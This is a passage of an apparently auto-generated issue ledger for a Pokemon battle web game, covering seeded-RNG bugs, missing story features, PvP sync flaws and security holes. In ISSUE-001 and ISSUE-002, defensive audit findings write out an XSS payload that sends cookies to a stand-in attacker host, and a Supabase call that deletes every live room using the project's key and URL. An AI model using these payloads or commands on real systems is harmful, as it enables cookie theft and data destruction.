# Issue Ledger — Pokemon Battle Arena

> **Generated**: 2026-05-22T07:30:56.347Z
> **Source**: `agent-state/findings/*.md` (57 unique findings after dedup)
> **Regenerate**: `node scripts/debug/issue-ledger.mjs`
> **Schema**: see `agent-state/LEDGER_SCHEMA.md`

This file is **regenerated**, not hand-edited. To add an issue, drop a
finding file into `agent-state/findings/` and re-run the ledger. To update
status, edit the corresponding finding file and re-run.

## Summary

| Severity | Count |
|---|---|
| P0 | 2 |
| P1 | 16 |
| P2 | 19 |
| P3 | 20 |
| **Total** | **57** |

| Category | Count |
|---|---|
| a11y | 12 |
| bug | 9 |
| data | 5 |
| dx | 7 |
| inconsistency | 9 |
| perf | 6 |
| refactor | 4 |
| security | 4 |
| test-gap | 1 |

## TOC

- [ISSUE-001] [P0] `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row — `applyBattleLogHtml` (security)
- [ISSUE-002] [P0] Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room — `pvp_rooms_update` (security)
- [ISSUE-003] [P1] `applyStatus` SLP duration roll + `endOfTurnEffects` Shed Skin roll use bare `Math.random()` — `applyStatus` (bug)
- [ISSUE-004] [P1] Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented — `BLACK_MARKET_ITEMS` (inconsistency)
- [ISSUE-005] [P1] `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext` — `canMove` (bug)
- [ISSUE-006] [P1] Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing — `illegalDealer` (inconsistency)
- [ISSUE-007] [P1] Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented — `itineraryProgress` (inconsistency)
- [ISSUE-008] [P1] `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped — `lastRemoteSeq` (bug)
- [ISSUE-009] [P1] Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift — `parseMoveEffects` (bug)
- [ISSUE-010] [P1] Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()` — `parseMoveEffects-onhit-abilities` (bug)
- [ISSUE-011] [P1] Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing — `pendingWager` (inconsistency)
- [ISSUE-012] [P1] `pushData` queue keeps advancing after a write fails — `_pushDataImpl` errors are swallowed to `console.warn`, leaving local state diverged from Supabase — `pushDataQueue` (bug)
- [ISSUE-013] [P1] `pvp_rooms` SELECT policy is `using (true)` — anyone with the public key can scrape every live match's full draft + battle state — `pvp_rooms_select` (security)
- [ISSUE-014] [P1] `remoteRowQueue` has no timeout — a hung `onOnlineRoomData` (e.g., a UI promise that never resolves) freezes ALL future remote updates — `remoteRowQueue` (bug)
- [ISSUE-015] [P1] `No Item` sentinel string used in 11 build slots is absent from `data/items.json` — `resolveCsvBuildEntry` (data)
- [ISSUE-016] [P1] Pokémon Trader (STORY_FEATURES_INTEGRATION.md §7) at City4 still missing — `traderOfferByCity` (inconsistency)
- [ISSUE-017] [P1] Speed-tie resolution + Quick Claw + lock-turn duration all use bare `Math.random()` in the turn loop — `turn-resolution` (bug)
- [ISSUE-018] [P1] `???` type used by gen1 `bide` and gen4 `curse` is not defined in `typeChart` — `typeChart` (data)
- [ISSUE-019] [P2] 7 duplicated `select('data').eq('id', roomId).single()` fetch+error blocks in online-pvp.js — `_hostRunResolution` (refactor)
- [ISSUE-020] [P2] Story autosave "💾 Saved" toast bypasses the polite live region — screen readers miss it — `_maybeShowSaveToast` (a11y)
- [ISSUE-021] [P2] Story tutorial overlay (STORY_TUTORIAL_SCENES) is not a dialog — no role, focus trap, or ESC — `_showStoryTutorialScene` (a11y)
- [ISSUE-022] [P2] Memory growth is benign (linear, ~25 KB/turn, R² = 0.712 — noise-dominated) and **does not indicate a leak**; the mandate's "60 turn / quadratic = P1" threshold is not hit — `benchMemoryGrowth` (perf)
- [ISSUE-023] [P2] `perf-bench.mjs` calls `parseMoveEffects(move)` with the wrong arg-count; the reported 1.4 ms "median" is the cost of a thrown `TypeError`, not real per-move parsing — `benchParseMove` (perf)
- [ISSUE-024] [P2] Turn-loop max latency is **78–84 ms** with IQR 12 ms — within the harness target (50 ms median is OK) but max is 5× the median, indicating a per-turn outlier path — `benchTurn` (perf)
- [ISSUE-025] [P2] `deepClone` falls back to `JSON.parse(JSON.stringify(...))` — silently drops Set/Map/Date/undefined/circular refs across the entire snapshot pipeline — `deepClone` (refactor)
- [ISSUE-026] [P2] Malva (Kalos E1) has a victory line but no intro pool in `TRAINER_QUOTES_BY_NAME` — `ELITE_VICTORY_LINES` (inconsistency)
- [ISSUE-027] [P2] Validator reports 6925 "CSV alternative" occurrences but every build file uses arrays — false positive — `expandCommaAlternatives` (dx)
- [ISSUE-028] [P2] 36 references to 18 distinct `global.__*` variables across `online-pvp.js` — the PvP module mutates host-side state through ad-hoc globals instead of a single observable — `global_state_coupling` (refactor)
- [ISSUE-029] [P2] 10 of 12 `.modal` overlays lack `role="dialog"` / `aria-modal` / labelledby — `modal-dialog-roles` (a11y)
- [ISSUE-030] [P2] Only `modal-summary` handles Escape — settings, abandon, alert, confirm modals trap keyboard users — `modal-escape-key` (a11y)
- [ISSUE-031] [P2] 29 of 31 mart/dept catalog items (potion, superPotion, X items, orbs, etc.) have no entry in `data/items.json` — `POKEMART_ITEMS` (data)
- [ISSUE-032] [P2] 6 silent `catch (e) {}` blocks in online-pvp.js swallow all errors without logging — `setBattleLogHtml` (dx)
- [ISSUE-033] [P2] Display names accepted up to 24 chars with zero sanitization — flow into innerText today, but one careless innerHTML downstream becomes XSS — `setDisplayName` (security)
- [ISSUE-034] [P2] Victory overlay is a plain `<div>` — no dialog role, no focus on Continue, ESC ignored — `showVictoryOverlay` (a11y)
- [ISSUE-035] [P2] 351 it.todo() stubs across 3 move-category test files — cluster enumeration — `tests/moves/by-category` (test-gap)
- [ISSUE-036] [P2] 56 Gym Leaders have no entry in `TRAINER_QUOTES_BY_NAME` — fall through to generic 6-line `Gym Leader` pool — `TRAINER_QUOTES_BY_NAME` (inconsistency)
- [ISSUE-037] [P2] Tooltip-only data (type chart, move info, status terms) is `onmousemove`-gated — keyboard & touch get nothing — `type-badge` (a11y)
- [ISSUE-038] [P3] `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads — `_pickCityQuoteLine` (inconsistency)
- [ISSUE-039] [P3] Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images — `_preloadedImages` (perf)
- [ISSUE-040] [P3] `createRoom` hardcodes Postgres SQLSTATE `23505` for unique-violation detection — defensive `.includes('duplicate')` fallback exists but the magic number is undocumented — `createRoom_23505` (refactor)
- [ISSUE-041] [P3] `isPokeball` flag set on 28 items but never read by the engine — dead metadata — `isPokeball` (data)
- [ISSUE-042] [P3] 9 legacy gen2 berries (Bitter, Burnt, Gold, Ice, Mint, Miracle, Mystery, PRZ Cure, PSN Cure) have no engine handler — `items.json` (data)
- [ISSUE-043] [P3] Engine cold-boot is 2.88 s in jsdom — within the harness target (5 s) but **14× the mandate's 200 ms target** — `loadEngine` (perf)
- [ISSUE-044] [P3] `console.log` cluster in battle.html — debug noise in shipped code — `loadGameData` (dx)
- [ISSUE-045] [P3] Online Host/Join form labels are not programmatically associated with their inputs — `modal-online-host` (a11y)
- [ISSUE-046] [P3] `parseMoveEffects` per-move latency varies by ~315× between fastest and slowest moves; outliers are 25–250× the median — `parseMoveEffects` (perf)
- [ISSUE-047] [P3] 129 `@keyframes` definitions but only 5 `prefers-reduced-motion` overrides — sprite-in, dialog-in, master-pulse, badge-pulse all unguarded — `prefers-reduced-motion` (a11y)
- [ISSUE-048] [P3] Room codes use `Math.random()` over 32 chars × 6 positions — 30 bits, birthday collision at ~30K concurrent rooms, retry-on-23505 saves correctness but not enumeration cost — `randomCode` (bug)
- [ISSUE-049] [P3] All 24 `#screen-*` containers are plain `<div>` — no `<main>` or `role="region"` — `screen-landmarks` (a11y)
- [ISSUE-050] [P3] Internal action keys use `Pokemon` (no diacritic) while UI labels use `Pokémon` — `STORY_EVENTS_RAW` (inconsistency)
- [ISSUE-051] [P3] 6+ stale `battle.html:LINE` refs in STORY_MODE_CATCH_INTEGRATION_RISK.md (avg drift ~9000 lines) — `STORY_MODE_CATCH_INTEGRATION_RISK.md` (dx)
- [ISSUE-052] [P3] 9 of 10 `battle.html:LINE` refs in STORY_MODE_FLOW.md are stale (avg drift ~7000 lines) — `STORY_MODE_FLOW.md` (dx)
- [ISSUE-053] [P3] 5+ stale `battle.html:LINE` refs in STORY_NARRATIVE_VARIANTS.md (variant-system anchors moved 3-5k lines) — `STORY_NARRATIVE_VARIANTS.md` (dx)
- [ISSUE-054] [P3] Tutorial scenes are text-only walls of 60-120 words — no audio, no progressive reveal, no skip-to-end affordance — `STORY_TUTORIAL_SCENES` (dx)
- [ISSUE-055] [P3] Mobile touch targets in story shops top out at 42px — under the WCAG 44×44 baseline — `story-shop-buy-btn` (a11y)
- [ISSUE-056] [P3] Tutorial overlay's four-stage entrance animation has no reduced-motion fallback — `story-tutorial-overlay` (a11y)
- [ISSUE-057] [P3] Master Ball purple pulse runs forever with no reduced-motion override; surrounding text/glow stays readable but the loop is hostile — `storyCatchMasterPulse` (a11y)

---

## <a id="ISSUE-001"></a> ISSUE-001: `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row

---
id: ISSUE-001
severity: P0
category: security
anchor_symbol: applyBattleLogHtml
current_line_hint: ~223
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: 965f251a0c94
confidence: high
status: open
---

**Title**: `applyBattleLogHtml` injects raw `battle_log_html` from the room row into the DOM — XSS sink fed by world-writable Supabase row

**Evidence**:
```js
// online-pvp.js L214-231  — capture host's #battle-log innerHTML, push as raw string,
// guest re-injects with .innerHTML (no sanitization, no DOMPurify, nothing).
function captureBattleLogHtml() {
    const el = global.document && global.document.getElementById('battle-log');
    return el ? el.innerHTML : '';
}
function applyBattleLogHtml(html) {
    const el = global.document.getElementById('battle-log');
    if (!el) return;
    el.innerHTML = typeof html === 'string' ? html : '';  // <-- SINK
}
// L629, L657, L708, L722 push battle_log_html; L757, L782 apply it on the guest.
```

**Repro**: Combined with the open RLS finding above: attacker calls `client.from('pvp_rooms').update({ data: { ...prev, battle_log_html: '<img src=x onerror="fetch(`https://attacker/?c=`+document.cookie)">', seq: prev.seq+1 } }).eq('id', live_room_id)`. The realtime UPDATE arrives at every subscribed peer (host + guest), passes the `seq > lastRemoteSeq` gate, reaches `onOnlineRoomData` → `guestApplyBattleBlob` (L782) or `guestApplyBattleStart` (L757), which calls `applyBattleLogHtml(d.battle_log_html)` → arbitrary script executes in the victim's origin. Steals localStorage (including the Supabase session if ever upgraded to auth) and the player's display name; can render fake "you lost" screens; can pivot to the rest of `battle.html` globals.

**Blast radius**: Every live PvP match. Even without the open-RLS angle, any peer is implicitly trusted: a malicious *host* can already feed the guest arbitrary HTML on every turn. `logMsg` at battle.html:12972 does `div.innerHTML = processedMsg` where `processedMsg` interpolates `mon.name` into both attribute and text contexts (`data-mn="${enc}"` is escaped, but the textContent slot `>${moveName}</span>` is not — and `mon.name` for a Pokemon comes from team builds that flow through the draft pool, so any custom team upload with a crafted `name` field plants a payload in the host's log, which then ships to the guest verbatim).

**Fix sketch**: Either (a) don't transmit HTML — send the structured log entries (array of `{ msg, type, mon, move }`) and let each client format with the same `logMsg` template-safe path; or (b) hard-sanitize through DOMPurify before `innerHTML=` (allow only `<div class="log-…"><span class="…" data-mn="…">…</span></div>` — no scripts, no `on*` attributes, no `javascript:`). (a) is the architecturally right answer because it also eliminates the size-of-HTML bloat in `data.battle_log_html`.

**Verification**: New integration test: simulate a remote row with `battle_log_html: '<img src=x onerror="window.__xssFired=true">'`, run through `guestApplyBattleBlob`, assert `window.__xssFired === undefined`. Plus a unit test asserting `applyBattleLogHtml` strips `<script>`, `on*` attributes, and `javascript:` URLs.

---

## <a id="ISSUE-002"></a> ISSUE-002: Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room

---
id: ISSUE-002
severity: P0
category: security
anchor_symbol: pvp_rooms_update
current_line_hint: ~43
file: supabase/migrations/001_online_pvp.sql
agents: [pvp-concurrency-hunter]
fingerprint: a1f5cf704e77
confidence: high
status: open
---

**Title**: Permissive RLS (`using (true)` for UPDATE/DELETE/INSERT) lets any anon client clobber/wipe any PvP room

**Evidence**:
```sql
-- supabase/migrations/001_online_pvp.sql L29-54  — ALL operations open to anon
-- "MVP: permissive policies for anon + authenticated clients using the anon key.
--  Tighten later (e.g. restrict updates to room owner, RPC join-by-code only)."
create policy "pvp_rooms_update" on public.pvp_rooms for update
  to anon, authenticated using (true) with check (true);
create policy "pvp_rooms_delete" on public.pvp_rooms for delete
  to anon, authenticated using (true);
create policy "pvp_rooms_insert" on public.pvp_rooms for insert
  to anon, authenticated with check (true);
```

**Repro**: With the publishable key from `online-config.js` (`sb_publishable_vLGEm7Ha50A9IhdnKdCoFA_znkPGI6i`) and `https://ynblrcxpubfevqgieuuo.supabase.co`, any third party can: `await client.from('pvp_rooms').delete().neq('id', '00000000-0000-0000-0000-000000000000')` — wipes every active match. Or `update().eq('id', target_room_id).set({data: { ...attacker_blob }})` — hijacks a match mid-draft to inject a chosen team for the opponent. Or `select('code, data')` — scrape every live game's draft picks.

**Blast radius**: Catastrophic for the online-PvP feature. The 002 migration added an atomic `try_join_pvp_room` RPC to fix one TOCTOU, but the underlying UPDATE policy remained wide open — every other write path (`pushData`'s `update().eq('id', roomId)` at L492) trusts the client and there is zero server-side guarantee that the writing client owns the room. This is exactly the "fix later" note that never got applied. All concurrency analysis below assumes a well-behaved peer; under the current RLS, a hostile peer with the anon key can override any of those guarantees by writing directly to the row.

**Fix sketch**: At minimum, route every write through SECURITY DEFINER RPCs that check a per-room caller token (host generates a UUID on createRoom, embedded in `data.host_token` & returned only to host; guest receives a different token via `try_join_pvp_room`). UPDATE policy then becomes `using ((data->>'host_token' = current_setting('request.header.x-pbs-token', true)) OR (data->>'guest_token' = current_setting('request.header.x-pbs-token', true)))`. DELETE policy should be host-only or RPC-only. SELECT can stay permissive (so spectators / rejoins work) but redact draft picks until phase='battle' if competitive integrity matters.

**Verification**: From a fresh browser, with no room joined, attempt `client.from('pvp_rooms').update({ data: { hostile: true } }).eq('id', '<live-room-id>')` — must return `error: row-level security policy violated` instead of silently succeeding.

---

## <a id="ISSUE-003"></a> ISSUE-003: `applyStatus` SLP duration roll + `endOfTurnEffects` Shed Skin roll use bare `Math.random()`

---
id: ISSUE-003
severity: P1
category: bug
anchor_symbol: applyStatus
current_line_hint: ~25882
file: battle.html
agents: [consistency-auditor]
fingerprint: 07e77424454f
confidence: high
status: open
---

**Title**: `applyStatus` SLP duration roll + `endOfTurnEffects` Shed Skin roll use bare `Math.random()`

**Evidence**:
```js
// L25882  (applyStatus)
mon.status = status; mon.statusTurns = 0;
if (status === "SLP") mon.sleepDuration = Math.floor(Math.random() * 3) + 1;
// L26016  (Eject Pack switch-in target)
let newMon = _bench[Math.floor(Math.random() * _bench.length)];
// L26135  (Shed Skin cure)
if (mon.ability === "Shed Skin" && mon.status && mon.currentHp > 0 && Math.random() < 1/3) {
```

**Repro**: Story battle, seed it, get put to sleep. Across two seeded replays the sleep duration will vary 1-3 turns, completely changing the battle.

**Blast radius**: SLP turns govern multiple subsequent decisions (Sleep Talk picks, wake roll timing). Eject Pack picks the wrong bench slot under drift. Shed Skin cures fire on different turns. All cascade.

**Fix sketch**: Same shim pattern. `const _rng = (sm && sm.active) ? storyRngNext : Math.random` at the top of `applyStatus`, replace L25882. Same shim in `endOfTurnEffects` for L26016 and L26135.

**Verification**: Add a seeded-replay assertion that records `mon.sleepDuration` after applying SLP under a known seed; assert identical across runs.

---

## <a id="ISSUE-004"></a> ISSUE-004: Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented

---
id: ISSUE-004
severity: P1
category: inconsistency
anchor_symbol: BLACK_MARKET_ITEMS
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 580596d9a9df
confidence: high
status: open
---

**Title**: Black Market shop from STORY_FEATURES_INTEGRATION.md §3 is still entirely unimplemented

**Evidence**:
```
$ grep -nE 'BLACK_MARKET|blackMarket|BlackMarket|black_market' battle.html
(no matches)
```

**Repro**: Open any City5+ hub, look for a Black Market button beside Mart / Department Store. Buttons absent regardless of progression. Spec promises `enterBlackMarket()` modal w/ Rare Candy / Mystery Egg / Forged Pass / Black Market TM / Intel Dossier / Fence / Shady Repel / Legend Chip SKUs, gated by `sm.blackMarketUnlocked && cityIdx >= 5`.

**Blast radius**: Six spec sections (§3, §3.5, §8, §10) hang off this; no `sm.blackMarketUnlocked` flag, no `enterBlackMarket()` route, no DX or QA pass possible. README §44 doesn't currently claim it, but `docs/STORY_FEATURES_INTEGRATION.md` is treated as canonical for the design vision, and the prior May 2026 audit ranked this #3 in priority — still unshipped.

**Fix sketch**: Author `BLACK_MARKET_ITEMS` const next to `POKEMART_ITEMS`/`DEPT_ITEMS` (anchor ~battle.html:28876 for the mart catalog), add `sm.blackMarketUnlocked` migration in a new `migrateStoryPreV20`, and add an `enterBlackMarket()` route + city-action button gated on `(sm.blackMarketUnlocked && getCityIndex() >= 5)`.

**Verification**: After implementation, `grep -nE 'BLACK_MARKET_ITEMS|enterBlackMarket' battle.html` returns ≥3 hits and a visit to City5 after itinerary beat shows the Black Market button.

---

## <a id="ISSUE-005"></a> ISSUE-005: `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext`

---
id: ISSUE-005
severity: P1
category: bug
anchor_symbol: canMove
current_line_hint: ~24232
file: battle.html
agents: [consistency-auditor]
fingerprint: 39f6ad985c2c
confidence: high
status: open
---

**Title**: `canMove` paralysis fizzle uses bare `Math.random()` while sibling freeze thaw uses `storyRngNext`

**Evidence**:
```js
// L24227-24230  (FRZ thaw — already deterministic)
if (mon.status === "FRZ") {
    const _thawRng = (sm && sm.active) ? storyRngNext : Math.random;
    if (_thawRng() < 0.2) { mon.status = null; logMsg(`${mon.name} thawed out!`, 'info'); return true; }
    logMsg(`${mon.name} is frozen solid!`, 'status'); return false;
}
// L24232 (PAR fizzle — STILL BARE)
if (mon.status === "PAR" && Math.random() < 0.25) { logMsg(`${mon.name} is paralyzed! It can't move!`, 'status'); return false; }
// L24257 (confusion self-hit — STILL BARE)
else if (Math.random() < 0.3333) {
    // Confusion self-hit ...
```

**Repro**: Story battle, seed it, paralyze the player's mon. Replay with same seed — paralysis "can't move" / "moves through it" outcomes will not match across replays.

**Blast radius**: Same class as the parseMoveEffects cluster, but in the very-hot path that runs every turn. Drift is more visible because PAR fizzles change whether a move lands at all (cascades into damage rolls, KOs, and switch order).

**Fix sketch**: Add the same `_rng = (sm && sm.active) ? storyRngNext : Math.random` shim at the top of `canMove` and replace L24232 PAR fizzle and L24257 confusion self-hit. The freeze branch already does this; copy the same idiom.

**Verification**: Seeded-replay test where the player's lead is PAR'd on turn 1 — assert PAR fizzle outcomes match across two seeded runs. Same for confusion self-hit.

---

## <a id="ISSUE-006"></a> ISSUE-006: Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing

---
id: ISSUE-006
severity: P1
category: inconsistency
anchor_symbol: illegalDealer
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 09f2ddbbdfb4
confidence: high
status: open
---

**Title**: Illegal Dealer NPC encounter (STORY_FEATURES_INTEGRATION.md §3.5) still missing

**Evidence**:
```
$ grep -nE 'illegalDealer|illegal_dealer|enterDealer|dealerOffer' battle.html
(no matches)
```

**Repro**: Visit City6 / City8 (the spec-promised "seedy hubs") at any badge count. No single-NPC contract loop appears. Spec promises one offer per city visit, six-to-ten contract templates (`Trade one party mon for two of same grade`, `Sell mon for large gold`, `Reveal next fixed trainer team`, etc.), the `Contraband Capsule` token item, plus hidden itinerary-clue reveals.

**Blast radius**: Differentiation table §3.5 contrasts Mart / Dept / Black Market / Illegal Dealer — the fourth identity is unrealized, so the "broad illegal catalog vs single shady contract" design split has no surface in code. Depends on Black Market only conceptually; could ship independently.

**Fix sketch**: New `illegalDealerOffer(cityIdx)` generator + `sm.illegalDealerOfferByCity` save field, render hook in `renderCityActions` for `cityIdx ∈ {6,8}` when `sm.blackMarketUnlocked === true`. Author bark / accept / decline dialogue and the contract template pool.

**Verification**: Visit City6 with `sm.blackMarketUnlocked = true`; see a single-NPC offer chip; declining clears it for the visit, leaving for next city restores it.

---

## <a id="ISSUE-007"></a> ISSUE-007: Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented

---
id: ISSUE-007
severity: P1
category: inconsistency
anchor_symbol: itineraryProgress
file: battle.html
agents: [spec-drift-auditor]
fingerprint: 4f2f5373374e
confidence: high
status: open
---

**Title**: Full Itinerary scaffolding (STORY_FEATURES_INTEGRATION.md §10) still entirely unimplemented

**Evidence**:
```
$ grep -niE 'itineraryProgress|itineraryBeat|runItinerary|enterItinerary|sm\.itinerary' battle.html
(no matches)
```

**Repro**: No itinerary beat fires at any event index. Spec §8 promises ordering `itinerary → wild → wager prompt → trainer` in `proceedToNextBattle`; today the order is just `wild → trainer`.

**Blast radius**: Every downstream spec system hangs off this — Black Market unlock comes from itinerary beat `blackMarketUnlock`, Safari Zone trigger is "after badge 3 / City3 segment", the three-act villain arc anchors to `sm.itineraryProgress` per `STORY_MODE_AUDIT.md` §14. Without the scaffold, the spec's narrative arc cannot exist.

**Fix sketch**: Author `STORY_ITINERARY` const (one row per beat: id, trigger condition, payload such as `{kind:'blackMarketUnlock'}`, `{kind:'safariType', type:'water'}`), add `sm.itineraryProgress = {}` to migrateStoryPreV20, implement `runItineraryBeat(beatId)` and call from `proceedToNextBattle` before `enterBattleEvent`.

**Verification**: After badge 3, on the route to City3, the itinerary engine fires a beat that flags `sm.blackMarketUnlocked = true` before the next trainer fight.

---

## <a id="ISSUE-008"></a> ISSUE-008: `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped

---
id: ISSUE-008
severity: P1
category: bug
anchor_symbol: lastRemoteSeq
current_line_hint: ~501
file: online-pvp.js
agents: [pvp-concurrency-hunter]
fingerprint: ff27549bd4fe
confidence: high
status: open
---

**Title**: `lastRemoteSeq` is updated *before* the remote handler runs — a thrown handler still bumps the watermark, so the failed update is permanently skipped

**Evidence**:
```js
// online-pvp.js L498-507
remoteRowQueue = remoteRowQueue
    .then(async () => {
        const d = newRow.data || {};
        if ((d.seq || 0) <= lastRemoteSeq) return;          // gate
        lastRemoteSeq = d.seq || lastRemoteSeq + 1;          // bump BEFORE await
        if (typeof global.onOnlineRoomData === 'function') {
            await Promise.resolve(global.onOnlineRoomData(d, { role, roomCode }));
            // ^ if this throws, lastRemoteSeq is already advanced;
            //   the same seq will never re-enter the handler.
        }
    })
    .catch((e) => console.warn('[OnlinePvP] onOnlineRoomData', e));
```

**Repro**: Force `onOnlineRoomData` to throw for a specific seq (e.g., guest receives `battle_start_blob` with a malformed JSON — `applyBattleSnapshot` returns false at L755 but earlier in the chain a `JSON.parse` could throw). `lastRemoteSeq` is now at that seq. The next legitimate update at seq+1 passes the gate fine, but the broken seq's data is *lost* — the guest's local state never reflects whatever info the broken row carried (e.g., new wins count, host display name update at L748-753). Symptom: scoreboard shows stale data even though both peers are connected.

**Blast radius**: Every conditional branch inside `onOnlineRoomData` (battle.html:14681-14760). Some are idempotent (later rows carry the same data, so the lost update is recovered when the next seq arrives — e.g., `host_display_name` is re-broadcast on every push). Others are not: `d.battle.state_blob` only arrives on resolved turns; a lost resolved-turn seq leaves the guest stranded a turn behind, and the host won't re-broadcast that exact seq.

**Fix sketch**: Move the `lastRemoteSeq` bump *after* a successful handler completion. Use a temporary "in-flight" marker if you need to deduplicate within a single tick. Pattern:
```js
remoteRowQueue = remoteRowQueue.then(async () => {
    const incoming = d.seq || 0;
    if (incoming <= lastRemoteSeq) return;
    try { await Promise.resolve(global.onOnlineRoomData(d, ...)); }
    catch (e) { console.warn(...); /* do NOT advance seq */ return; }
    lastRemoteSeq = incoming;   // only on success
});
```
Combined with the timeout from the previous finding, this stays robust against hung handlers (timeout → seq does not advance → next row at same seq is allowed to retry).

**Verification**: Test: inject one row at seq=5 where the handler throws, then a row at seq=6. Assert: after both, `lastRemoteSeq === 5` (or the system retried seq=5), not 6.

---

## <a id="ISSUE-009"></a> ISSUE-009: Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift

---
id: ISSUE-009
severity: P1
category: bug
anchor_symbol: parseMoveEffects
current_line_hint: ~24350
file: battle.html
agents: [consistency-auditor]
fingerprint: 0729606b5ddb
confidence: high
status: open
---

**Title**: Many `parseMoveEffects` branches still use bare `Math.random()` — seeded story replays drift

**Evidence**:
```js
// L24350  if (move.name === "Bounce" && Math.random() < 0.3) { applyStatus(defender, "PAR"); return; }
// L24427  let newType = resistTypes[Math.floor(Math.random() * resistTypes.length)];
// L24461  if (statusCode && Math.random() < (sereneGrace ? Math.min(1, chance * 2) : chance)) {
// L24729  let newMon = bench[Math.floor(Math.random() * bench.length)];   // Roar/Whirlwind switch
// L24885  let _acuStat = _acuAvail[Math.floor(Math.random() * _acuAvail.length)]; // Acupressure
// L24991  if (move.name === "Tri Attack" && Math.random() * 100 < _sg(20)) {
// L24992  let _tr = Math.floor(Math.random() * 3);  // Tri Attack BRN/FRZ/PAR
// L25019  if (Math.random() * 100 >= _sg(_secChance)) continue; // data-driven secondary
// L25038  if (attacker.ability === "Stench" && ... && Math.random() < 0.1) {
```

**Repro**: Load story with `?seed=X`, fight a battle where the opponent has Tri Attack / Acupressure / a secondary-effect mover (e.g. Iron Head with 30% flinch). Re-load the same seed and replay the same inputs — the outcome diverges because each of these branches consults `Math.random()` instead of the seeded `storyRngNext` (which sibling sites at L24228 thaw, L25002 confuse, L25083 trap, L25526 cr, L26481 harvest correctly call).

**Blast radius**: All story-mode seeded replays. Daily-seed contests. Player-shared run-the-seed videos. Class is exactly the one the spec called out months ago — these sites were missed when the audit converted confusion/trap/thaw/harvest. At least 9 distinct sites in `parseMoveEffects` plus the broader status/end-of-turn pipeline.

**Fix sketch**: At the top of `parseMoveEffects` (or right before the first call site), bind `const _rng = (sm && sm.active) ? storyRngNext : Math.random;` and replace every bare `Math.random()` inside the function body with `_rng()`. Mirror the same pattern in `applyStatus`, `endOfTurnEffects`, the speed-tie block in the main turn loop (L19368), and the Quick Claw rolls (L19353-19354).

**Verification**: New seeded-replay test: run the same seed × two trials through a battle that triggers Tri Attack / Bounce-paralysis / Roar / Static-on-contact. Assert identical move sequences. Existing `tests/integration/story-flow.test.js` seeded assertion should catch any regression on the converted sites.

---

## <a id="ISSUE-010"></a> ISSUE-010: Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()`

---
id: ISSUE-010
severity: P1
category: bug
anchor_symbol: parseMoveEffects-onhit-abilities
current_line_hint: ~22461
file: battle.html
agents: [consistency-auditor]
fingerprint: aa60883b8c97
confidence: high
status: open
---

**Title**: Contact-ability procs (Static / Poison Point / Flame Body / Cute Charm / Poison Touch / Toxic Chain / Cursed Body) all bare `Math.random()`

**Evidence**:
```js
// L22461-L22485 — on-contact / on-hit ability procs
if (defender.ability === "Static" && Math.random() < 0.3) applyStatus(attacker, "PAR");
if (defender.ability === "Poison Point" && Math.random() < 0.3) applyStatus(attacker, "PSN");
if (defender.ability === "Flame Body" && Math.random() < 0.3) applyStatus(attacker, "BRN");
if (defender.ability === "Cute Charm" && Math.random() < 0.3 ...) { ...
if (attacker.ability === "Poison Touch" && Math.random() < 0.3) applyStatus(defender, "PSN");
if (attacker.ability === "Toxic Chain" && ... && Math.random() < 0.3) { ...
if (defender.ability === "Cursed Body" && Math.random() < 0.3 && move.name) { ...
// L22538 — Tough Claws-style ability tick: if (... && Math.random() < 0.1)
// L22075 — Focus Band proc: && Math.random() < 0.1
// L22151 — recoil/self-stat secondary: if (Math.random() * 100 < _selfChance)
```

**Repro**: Story-mode fight against a Static Pikachu — same seed, same inputs, two different "paralysed on contact" outcomes.

**Blast radius**: These procs gate huge follow-on consequences (PAR drops Speed; PSN/BRN deal chip damage; Cursed Body locks a move). Drift here can change the seed result by 5-10 turns.

**Fix sketch**: Same shim. Convert every `Math.random()` call inside `parseMoveEffects` between L22000-23000 (on-hit / ability / item-trigger region) to the seeded `_rng()`. Audit the whole damage-resolution block in one sweep.

**Verification**: Seeded replay where the foe runs Static. Assert PAR-on-contact happens (or doesn't) identically across runs.

---

## <a id="ISSUE-011"></a> ISSUE-011: Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing

---
id: ISSUE-011
severity: P1
category: inconsistency
anchor_symbol: pendingWager
file: battle.html
agents: [spec-drift-auditor]
fingerprint: b2982543c7b0
confidence: high
status: open
---

**Title**: Battle for Pokémon wager system (STORY_FEATURES_INTEGRATION.md §6) still missing

**Evidence**:
```
$ grep -niE 'pendingWager|setWager|wagerOpponent|wagerBattle|battleWager|wagerPrompt|wagerOffer|placeWager' battle.html
(no matches)
```
The only `wager` hits in battle.html (lines 36440, 41797, 42065) belong to the **Casino** prize-wall flow, NOT the spec's pre-battle Pokémon-trade wager.

